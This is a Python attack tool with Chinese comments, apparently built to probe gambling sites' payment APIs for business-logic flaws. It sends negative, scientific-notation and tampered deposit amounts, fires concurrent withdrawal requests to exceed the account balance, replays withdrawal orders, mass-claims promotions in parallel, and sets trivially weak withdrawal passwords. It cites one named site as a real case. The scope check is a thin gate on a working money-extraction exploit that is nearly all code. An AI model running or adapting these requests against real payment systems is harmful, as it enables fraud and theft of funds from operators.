#!/usr/bin/env python3
"""业务逻辑漏洞探针 — 博彩站专项（充值/提现/并发/订单）。

博彩站最容易忽视的攻击面之一：**业务逻辑漏洞**
常见案例：
  1. 负数充值（amount=-100）→ 系统给你加钱
  2. 充值金额篡改（前端传 100，改成 0.01）→ 用 0.01 充 100 的值
  3. 并发超额提现（同时提交 10 笔，每笔 = 全部余额）→ 提现 10x
  4. 提现订单状态重放（重复 POST 同一订单 ID）
  5. 优惠码重复领取（并发 50 个请求同时领）
  6. 首充奖励重复触发（换账号注册后首充）
  7. 代理商佣金套利（自充值 → 给自己返佣）
  8. 游戏返水重复申请

跨状态 / wallet_id / 展示层地址 / 双路径走 fund_edge_ops_probe.py（本探针只打单接口竞态）。

示例:
  python3 炼蛊房/logic_vuln_probe.py doctor
  python3 炼蛊房/logic_vuln_probe.py scan \
    --base https://target.com --token <token> --case <案卷>
  python3 炼蛊房/logic_vuln_probe.py concurrent \
    --url https://target.com/api/withdraw/apply \
    --amount 100 --token <token> --threads 20 --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import sys
import threading
import time
import concurrent.futures
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "logic_vuln"
    d.mkdir(parents=True, exist_ok=True)
    return d

# 博彩站充值/提现 API 端点
DEPOSIT_ENDPOINTS = [
    "/api/deposit/apply", "/api/deposit/create", "/api/recharge/apply",
    "/api/recharge/create", "/api/pay/create", "/api/order/create",
    "/api/topup/apply",
]
WITHDRAW_ENDPOINTS = [
    "/api/withdraw/apply", "/api/withdraw/create", "/api/withdrawal/apply",
    "/api/cashout/apply", "/api/payout/apply",
]
PROMO_ENDPOINTS = [
    "/api/promo/claim", "/api/activity/claim", "/api/bonus/claim",
    "/api/coupon/use", "/api/gift/claim", "/api/reward/claim",
    "/api/rebate/apply",   # 返水
    "/api/firstdeposit",  # 首充
]

def make_sess(token: str, cookie: str = "") -> requests.Session:
    import requests as rq
    s = rq.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile"
    s.headers["Content-Type"] = "application/json"
    if token:
        s.headers["Authorization"] = f"Bearer {token}"
        s.headers["token"] = token
    if cookie:
        s.headers["Cookie"] = cookie
    return s

def _post_json(sess, url: str, body: dict, timeout: float = 10.0) -> dict:
    try:
        r = sess.post(url, json=body, timeout=timeout)
        data = {}
        try: data = r.json()
        except: pass
        return {"status": r.status_code, "data": data, "raw": r.text[:300]}
    except Exception as e:
        return {"status": -1, "error": str(e)}

def _success_check(resp: dict) -> bool:
    data = resp.get("data", {})
    if not isinstance(data, dict):
        data = {}
    code = data.get("code", data.get("status", resp.get("status", -1)))
    return (code in (0, 200, "0", "200") and
            resp.get("status") == 200 and
            "error" not in str(data.get("msg", "")).lower())

# ────── 测试 1：负数金额 ──────
def test_negative_amount(sess, base: str, endpoints: list, token: str) -> list:
    hits = []
    test_amounts = [-100, -1, -0.01, -999999, 0]
    for path in endpoints:
        url = base + path
        for amt in test_amounts:
            body = {"amount": amt, "money": amt, "price": amt, "token": token}
            r = _post_json(sess, url, body)
            if _success_check(r):
                print(f"  ★ 负数金额接受: {path} amount={amt}")
                hits.append({"type": "negative_amount", "endpoint": path,
                              "amount": amt, "response": r})
    return hits

# ────── 测试 2：金额精度/篡改 & 科学计数法绕过 ──────
def test_amount_tamper(sess, base: str, endpoints: list, token: str) -> list:
    """
    wlyx888 实战案例：deposit_okpay 接受 '1e3'（科学计数法），后端当作 1000 处理，
    但通道限额是 max=10，绕过了上限校验。同理可测 0.001 / 1e-3 等。
    """
    hits = []
    # 微小金额（精度截断漏洞）
    test_amounts_float = [0.001, 0.0001, 0.00001, 1e-10]
    # 科学计数法绕过金额上限（wlyx888 blackbox 实证）
    test_amounts_sci = ["1e3", "1e4", "1e2", "9.9e1", "1.1e1", "1E3", "1.0e3", "+1e3"]
    # 超大金额
    test_amounts_large = [999999, 1000000, 9999999]
    for path in endpoints:
        url = base + path
        for amt in test_amounts_float:
            body = {"amount": amt, "money": amt, "token": token,
                    "type": "1", "paytype": "1"}
            r = _post_json(sess, url, body)
            if _success_check(r):
                print(f"  ★ 微小金额接受: {path} amount={amt}")
                hits.append({"type": "amount_tamper_small", "endpoint": path,
                              "amount": str(amt), "response": r})
        for amt_str in test_amounts_sci:
            body = {"amount": amt_str, "money": amt_str, "token": token,
                    "type": "1", "paytype": "1"}
            r = _post_json(sess, url, body)
            if _success_check(r):
                print(f"  ★ 科学计数法接受: {path} amount={amt_str!r}  (绕过金额上限！)")
                hits.append({"type": "amount_scientific_notation", "endpoint": path,
                              "amount": amt_str, "response": r})
        for amt in test_amounts_large:
            body = {"amount": amt, "money": amt, "token": token,
                    "type": "1", "paytype": "1"}
            r = _post_json(sess, url, body)
            if _success_check(r):
                print(f"  ★ 超大金额接受: {path} amount={amt}")
                hits.append({"type": "amount_too_large", "endpoint": path,
                              "amount": amt, "response": r})
    return hits

# ────── 测试 3：并发提现 ──────
def test_concurrent_withdraw(sess_factory, url: str, amount: float,
                              token: str, threads: int = 20) -> dict:
    results = []
    lock = threading.Lock()

    def do_withdraw():
        sess = sess_factory()
        body = {"amount": amount, "money": amount, "token": token,
                "paypass": "123456", "bank_card": "6222001000012345678",
                "bank_name": "工商银行", "real_name": "张三"}
        r = _post_json(sess, url, body, timeout=15.0)
        with lock:
            results.append(r)
            if _success_check(r):
                print(f"  ★ 并发提现成功: {r['data']}")

    print(f"[*] concurrent withdraw: {threads} threads × {url}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futs = [pool.submit(do_withdraw) for _ in range(threads)]
        concurrent.futures.wait(futs)

    success_count = sum(1 for r in results if _success_check(r))
    return {"url": url, "threads": threads, "success": success_count,
            "total": len(results), "results": results[:5]}

# ────── 测试 4：订单重放 ──────
def test_order_replay(sess, base: str, endpoints: list, token: str) -> list:
    hits = []
    for path in endpoints:
        url = base + path
        # 先提交一次
        order_id = f"test_{int(time.time())}"
        body = {"amount": 1, "token": token, "order_id": order_id,
                "orderId": order_id, "out_trade_no": order_id}
        r1 = _post_json(sess, url, body)
        if not _success_check(r1):
            continue
        time.sleep(0.5)
        # 重放
        r2 = _post_json(sess, url, body)
        if _success_check(r2):
            print(f"  ★ 订单重放成功: {path} order_id={order_id}")
            hits.append({"type": "order_replay", "endpoint": path,
                          "order_id": order_id, "r1": r1, "r2": r2})
    return hits

# ────── 测试 5：优惠码并发领取 ──────
def test_promo_concurrent(sess_factory, base: str, endpoints: list,
                           token: str, threads: int = 30) -> list:
    hits = []
    for path in endpoints:
        url = base + path
        # 先单次测试端点是否存在
        r = _post_json(sess_factory(), url, {"token": token}, timeout=5)
        if r.get("status") == 404:
            continue

        results = []
        lock = threading.Lock()
        def claim():
            s = sess_factory()
            r = _post_json(s, url, {"token": token, "activity_id": "1",
                                     "type": "1", "code": "promo2024"})
            with lock: results.append(r)

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            futs = [pool.submit(claim) for _ in range(threads)]
            concurrent.futures.wait(futs)

        success = [r for r in results if _success_check(r)]
        if len(success) > 1:
            print(f"  ★ 并发重复领取: {path}  {len(success)}/{threads} 成功")
            hits.append({"type": "promo_concurrent", "endpoint": path,
                          "success_count": len(success), "total": threads})
    return hits

# ────── 测试 6：提现密码弱口令探测 ──────
def test_weak_withdraw_pass(sess, base: str, token: str) -> list:
    """
    wlyx888 实战案例：upwithpass 可成功设置 '1'、'2'、'a' 等极弱提现密码，
    postwithdrawal 后续用这些弱密码也能通过校验直到"余额不足"分支。
    """
    hits = []
    setup_endpoints = ["/api/upwithpass", "/api/setwithdrawpass",
                       "/api/setpassword/withdraw", "/api/user/setpaypass"]
    check_endpoints = ["/api/ifwithpassset", "/api/getwithdrawpass",
                       "/api/user/haswithdrawpass"]
    weak_passes = ["1", "2", "a", "ab", "111", "000", "123", "abc",
                   "1234", "0000", "1111", "pass", "test", "aa"]
    for setup_path in setup_endpoints:
        url = base + setup_path
        for wp in weak_passes:
            body = {"token": token, "withpassword": wp, "paypass": wp,
                    "password": wp, "pass": wp, "newpass": wp}
            r = _post_json(sess, url, body)
            if _success_check(r):
                print(f"  ★ 弱提现密码被接受: {setup_path} pass={wp!r}  (CRITICAL)")
                hits.append({"type": "weak_withdraw_pass", "endpoint": setup_path,
                              "password": wp, "response": r})
    return hits

def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_REQUESTS else 'missing'}] requests")
    print("[ok] logic_vuln_probe ready (incl. scientific notation + weak withdrawal pass)")
    return 0

def cmd_scan(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    sess = make_sess(args.token, args.cookie)
    sess_factory = lambda: make_sess(args.token, args.cookie)
    all_hits = []

    print("[*] Test 1: 负数充值金额")
    all_hits += test_negative_amount(sess, base, DEPOSIT_ENDPOINTS, args.token)

    print("[*] Test 2: 微小金额篡改")
    all_hits += test_amount_tamper(sess, base, DEPOSIT_ENDPOINTS, args.token)

    print("[*] Test 3: 订单重放（提现）")
    all_hits += test_order_replay(sess, base, WITHDRAW_ENDPOINTS, args.token)

    print(f"[*] Test 4: 优惠码并发领取 ({args.threads} threads)")
    all_hits += test_promo_concurrent(sess_factory, base, PROMO_ENDPOINTS,
                                       args.token, args.threads)

    print("[*] Test 5: 提现密码弱口令（wlyx888 实证：1/a 均可设置）")
    all_hits += test_weak_withdraw_pass(sess, base, args.token)

    out = case_dir(args.case)
    out_json = out / "logic_scan.json"
    out_json.write_text(json.dumps({"ts": _now(), "base": base, "hits": all_hits},
                                   ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(all_hits)} logic vulnerabilities found → {out_json}")
    return 0 if all_hits else 1

def cmd_concurrent(args: argparse.Namespace) -> int:
    """专门测试并发提现 race condition。"""
    domain = host_of(args.url)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    sess_factory = lambda: make_sess(args.token)
    result = test_concurrent_withdraw(sess_factory, args.url, args.amount,
                                       args.token, args.threads)
    out = case_dir(args.case)
    (out / "concurrent_withdraw.json").write_text(
        json.dumps({"ts": _now(), **result}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8")
    print(f"[result] success={result['success']}/{result['total']} → {out}")
    if result["success"] > 1:
        print(f"\n★★★ 并发超额提现！{result['success']} 笔同时成功")
    return 0 if result["success"] > 1 else 1

def main() -> int:
    p = argparse.ArgumentParser(description="业务逻辑漏洞探针（博彩站）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    sc = sub.add_parser("scan", help="批量扫描所有逻辑漏洞")
    sc.add_argument("--base", required=True)
    sc.add_argument("--case", required=True)
    sc.add_argument("--token", default="")
    sc.add_argument("--cookie", default="")
    sc.add_argument("--threads", type=int, default=30)
    sc.set_defaults(func=cmd_scan)

    cc = sub.add_parser("concurrent", help="专项并发提现 race condition")
    cc.add_argument("--url", required=True)
    cc.add_argument("--amount", type=float, required=True)
    cc.add_argument("--case", required=True)
    cc.add_argument("--token", default="")
    cc.add_argument("--threads", type=int, default=20)
    cc.set_defaults(func=cmd_concurrent)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
